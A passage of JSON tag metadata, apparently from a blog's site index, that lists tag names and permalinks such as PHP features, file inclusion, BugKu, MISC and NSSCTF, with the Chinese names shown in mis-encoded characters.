E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://lvzhouhang.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/tags/BugKu/"},{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/tags/MISC/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://lvzhouhang.xyz/tags/NSSCTF/"}]}